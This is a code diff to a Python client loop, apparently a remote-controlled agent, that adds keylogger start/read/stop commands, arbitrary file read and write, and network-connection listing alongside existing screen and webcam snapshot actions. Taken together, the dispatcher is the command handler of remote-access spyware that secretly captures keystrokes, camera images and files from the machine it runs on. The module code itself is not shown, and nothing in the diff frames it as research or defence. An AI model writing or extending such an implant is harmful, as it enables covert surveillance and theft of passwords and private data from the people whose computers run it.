@@ -51,6 +51,19 @@ async def run() -> None:
                         result = modules.snapshot(False)
                     elif action == "WEBCAM_SNAPSHOT":
                         result = modules.snapshot(True)
+                    elif action == "START_KEYLOGGER":
+                        result = modules.start_keylogger()
+                    elif action == "GET_KEYLOGGER":
+                        result = modules.get_keylogger()
+                    elif action == "STOP_KEYLOGGER":
+                        result = modules.stop_keylogger()
+                    elif action == "READ_FILE":
+                        result = modules.read_file(payload.get("path", ""))
+                    elif action == "WRITE_FILE":
+                        result = modules.write_file(payload.get("path", ""), payload.get("data", ""))
+                        
+                    elif action == "NETWORK_MONITOR":
+                        result = modules.network_connections()
                     else:
                         result = {"ok": False, "error": "unsupported action"}
 
@@ -62,7 +75,7 @@ async def run() -> None:
         except Exception as error:
             print(f"agent reconnecting in {backoff}s: {error}")
             await asyncio.sleep(backoff)
-            backoff = min(backoff * 2, 60)  # exponential backoff, cap at 60s
+            backoff = min(backoff * 2, 60) 
 
 
 if __name__ == "__main__":
